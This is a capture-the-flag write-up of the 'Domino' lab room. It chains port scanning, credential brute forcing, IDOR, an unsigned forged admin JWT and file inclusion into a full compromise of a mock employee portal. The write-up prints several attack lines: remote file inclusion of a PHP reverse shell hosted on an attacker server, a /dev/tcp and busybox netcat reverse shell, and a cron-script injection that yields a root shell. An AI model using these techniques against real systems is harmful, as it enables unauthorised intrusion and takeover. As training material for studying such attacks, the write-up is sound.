# Domino Write-up

![Picture of the room](/Medium_rooms/Domino/Screenshots/00_Room.png)

Welcome to another write-up. In this room, we are tasked to assess how the NexusCorp Employee Portal internal application behaves. We'll have to chain multiple vulnerabilities and exploit them in order to achieve a full compromise.

## Reconnaissance

You already guessed, it's port scan time! We'll run the following nmap command

```bash
nmap -sV -sC TARGET_IP
```

We get the following results

![Picture of the room](/Medium_rooms/Domino/Screenshots/01_Portscan.png)

Besides the application running on port 80, we only have SSH open, which is good for later compromise

I visited the application and before using any other tools, I first of all like to do manual enumeration. When visiting the application, you are forced to log into the portal

![Picture of the room](/Medium_rooms/Domino/Screenshots/02_login.png)

One thing I like to try first is to check the source code, since valid credentials are usually stored there in CTF challenges, but this time there weren't any. I also tried default credentials like `admin:admin` and common SQL injection techniques like `' OR 1=1;--` to name one.
I might come back to this and use sqlmap if I don't find anything else

I also noticed a page where all their employees are listed with emails and full names

![Picture of the room](/Medium_rooms/Domino/Screenshots/03_Team.png)

We could try a brute force attempt on all of them, but that might take too long for a CTF challenge. A password spraying attack might be more likely if there is a first logon default password and if we find it. 

I didn't find anything special with manual enumeration, so now I ran gobuster to find any directories

```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x.php,.txt
```

![Picture of the room](/Medium_rooms/Domino/Screenshots/04_gobuster.png)

Some interesting results here are: `config.php`, `api`, `admin` and `backup`. Most of the pages just redirect back to the login page, and admin just shows a self designed 403 HTTP error. However, `/backup` has directory listing enabled, and there is a config file there

![Picture of the room](/Medium_rooms/Domino/Screenshots/05_backup-dir.png)

That file it is encrypted, so we can't read it without a decryption key. Luckily, the `README.txt` in there points to a `/static` page to look up how to decrypt it

![Picture of the room](/Medium_rooms/Domino/Screenshots/06_app-js.png)

I looked up a way how to decode it with OpenSSL, yet the passphrase didn't work at first. I suspected that's because the pass is only 14 bytes long, and there was a note saying to pad to 16 bytes. I decided to use OpenSSL way to use a hex key instead of a passphrase, so I could append two null bytes (0x00). This was my final command

```bash
openssl enc -aes-128-ecb -d -K REDACTED0000 -in config.enc -out config.txt
```

Sadly, all of that effort for nothing

![Picture of the room](/Medium_rooms/Domino/Screenshots/07_decoded-conf.png)

That's the frustrating part no one talks about. I spent half an hour trying to get a working command. 

## First logon 

I started a brute force attempt, and while that was running, I wanted to run sqlmap. 
Here is the wordlist from every person on the teams page. 
```txt
laura.hayes
michael.chen
sarah.johnson
robert.wilson
emma.taylor
david.brown
james.wright
```

For the brute forcing attempt, I am running ffuf, as I feel like it runs faster on the attack box than hydra
```bash
ffuf -w users.txt:W1,/usr/share/wordlists/rockyou.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.112.130.87 -fc 200
```

![Picture of the room](/Medium_rooms/Domino/Screenshots/08_ffuf%20results.png)

Since we got valid credentials so quick, I didn't use sqlmap. The most interesting user is probably Sarah Johnson, as she is a senior software engineer. Logging in as her, we see the following

![Picture of the room](/Medium_rooms/Domino/Screenshots/09_dashboard.png)

There are 3 api endpoints in total. We can request files with a files endpoint, we can request a JSON web token and we can request user information through the `My Profile API`
There could be several vulnerabilities: IDOR for the user endpoint, file inclusion or path traversal or SSRF for the files endpoint and of course, session manipulation thanks to the JWT endpoint.

I tested the users endpoint first, changed the value of the parameter in the api request and was able to see other users information

![Picture of the room](/Medium_rooms/Domino/Screenshots/10_IDOR-success.png)

Now when using the files endpoint, you need your JWT, which you can get from the `/api/auth/token.php` endpoint. For that. let's open up burp suite. When sending a request to the token endpoint, we get the token and a note

```txt
token:	"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTUwMTY4MTUsImV4cCI6MTc5NTAyMDQxNX0.F9heS5RvfitupuN2snin8F3hI93VuCpOcL7qyJo4hog"

expires_in:	3600

note:	"Use this token as: Authorization: Bearer <token> for /api/files.php"
```

I appended the header from the notes section to the request header of the files endpoint and got the following result. 

![Picture of the room](/Medium_rooms/Domino/Screenshots/11_Modified-package.png)

Interestingly, it's a different response than the one I got before `JWT requiered [...]`. It now says `admin JWT requiered`, thus I came to the conclusion that the JWT is encoded, which tokens usually are. The question is though, can we decode it?  

The answer to that quest is yes! I used [Cyberchef](https://gchq.github.io/CyberChef/) since it has a 'magic' option, which sometimes detects how something has been encoded. In this case, it detected that it's just a normal JWT encode, which can be decoded with their `JWT Decode` recipe. 

![Picture of the room](/Medium_rooms/Domino/Screenshots/12_decoded-JWT.png)

We could try to modify this json data to include the username of the admin with the admin role. If the server doesn't validate the request correctly, it should be no problem. 

```json
{
    "sub": "laura.hayes",
    "role": "admin",
    "iat": 1795016815,
    "exp": 1795020415
}
```

However, as I never worked with JWT so far - only with cookies - I had to do some research. I knew JWT existed, yet deeper understanding of them were missing.

JSON web tokens consist of three parts: A header, a payload and a signature. Each of them are separated by a `.`
-> `header.payload.signature`

The Cyberchef recipe only decoded the payload, which is the raw json data. Header and payload are both Base64Url encoded, only the signature isn't. It uses signing algorithms like HS256 or RS256

One common vulnerability when it comes to JWT is, that the signature isn't validated by the server. We could just use any Signature and encode it with the right algorithm, which we get from the header. 

I used [jwt.io](https://www.jwt.io/) to encode the modified json data
```txt
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NTE4NDA4NiwiZXhwIjoxNzk1MTg3Njg2fQ.
```
> As you can see, I didn't even use a signature, yet the application accepted the token

We get the following response
```json
{
"error":"Missing name parameter",
"usage":"\/api\/files.php?name=\/var\/www\/html\/filename.txt"
}
```

The `usage` value tells us how to retrieve the files correctly. If you remember from our gobuster scan, there is a `config.php` file which didn't show anything when trying to access it. With this API, we might be able to retrieve it's contents.  

![Picture of the room](/Medium_rooms/Domino/Screenshots/13_config-data.png)

This is really valuable information! We now know how they sign their JWT (even though the server never validated the signatures in the first place), and we know about their database password. Sadly, there is no MySQL service running on the host, recalling from the port scan. Even after I did a full port scan (`-p-`), no port was found listening for MySQL requests. 

I tried the `DB_Password` for the devops user through ssh, since a lot of people are just reusing their password, especially devops developer, who might not think about shifting left like devsecops. It actually worked! BUT, I still wanted to test something else, and not just jump straight to privilege escalation

File APIs like these are commonly vulnerably to File inclusion, and there are two types of these vulnerabilities: Local (LFI) and remote file inclusion (RFI). 

So far, we only successfully performed LFI, but what about RFI. Can we make the server send a request to our server on the applications behalf? Yes we can!

We can use that to achieve Remote code execution if we upload a PHP reverse shell to our controlled server and make the application send a request to it. For that, go to [revshells.com](https://www.revshells.com/) and generate a PHP shell. I used the **PHP PentestMonkey** rev shell, however a small one will probably work as well.
## Gaining initial access

Follow these steps:
1. Generate the reverse shell and host it on your server
2. Start your server with `python3 -m http.server 8000`
3. Start a listener on port 4444 `nc -lvnp 4444`
4. Through the API endpoint, sent the following request: `/api/files.php?name=http://ATTCKER:8000/shell.php`

![Picture of the room](/Medium_rooms/Domino/Screenshots/14_RCE.png)

From there, we can get flags 2 and 3:
flag 2: `cat /var/www/html/admin/index.php`
flag 3: `cat /opt/flag3.txt`

> Quick note: Flag 2 was supposed to be get through a XSS vulnerability it seems. I tried one at the `support ticket` site, but I didn't get the admin's cookie when it sent a request to my server with the usual cookie stealing XSS approach.

## Privilege Escalation

As I already mentioned before, the Devops user reused his credentials, typical devops. So once you got access as `www-data`, just use `su devops` and enter the `DB_Pass` from `config.php`

From there on, I first of all tried common privilege escalation attempts, such as checking SUID perms, sudo perms, cron jobs, processes, all of that. The only interesting thing I noticed was the `/opt/admin_bot.py`. I also noticed the devops user has full permissions for that file. However, this process is only being started at system start up. If I wanted to put a python reverse shell in there, I would need to reboot the whole system. So that of course, didn't work

However once in the `/opt` directory, I noticed a `tools` directory. Maybe the devops user has tools in there that can be exploited since they have been granted too much privileges. That wasn't the case, only a `pspy64` tool was in that directory. I looked up what that tool does, Turns out it finds processes that tools like `ps` (Which I was using) usually miss. 

I ran the tool, and after waiting a minute, I saw this

![Picture of the room](/Medium_rooms/Domino/Screenshots/15_Background-processes.png)

There is a shell script called `/opt/monitoring/health_report.sh` being executed every minute with root privileges, judging by the UID=0. I already checked that script before I used the tool, since `monitoring` was also in the `/opt` directory. This script is owned by root, but devops has full privileges for that script as well. So, we just put a reverse shell in there.

Just using the basic shell payload `/bin/sh -i >& /dev/tcp/ATTACKER/5555 0>&1` doesn't work, the shell is closed immediately. I already had this problem once, and `busybox` was my solution to this. So I tried that again and it worked

```bash
busybox nc TARGET 5555 -e /bin/sh
```

![Picture of the room](/Medium_rooms/Domino/Screenshots/16_Root-shell.png)

And we are done!

## Conclusion

A really nice boot2root challenge! I had a lot of fun solving everything, but the JWT gave me a headache. Somehow, my forged admin JWT didn't work, even though I knew the vulnerability (as I left the signature to see if I still get `Admin token required`). That was really frustrating, so I gave up for the day as it was getting late. The next day, I tried the same approach like the day before, and suddenly it worked, I still don't get it. Besides that, I liked it a lot. I got to chain vulnerabilities to achieve full compromise. It felt good using everything I learned together and in a hands-on lab.
I also got to learn more about JWT and cryptographic algorithms like AES-ECB-128 

## References
- https://secops.group/blog/understanding-jwt-security-and-common-vulnerabilities/
- https://www.kali.org/tools/pspy/
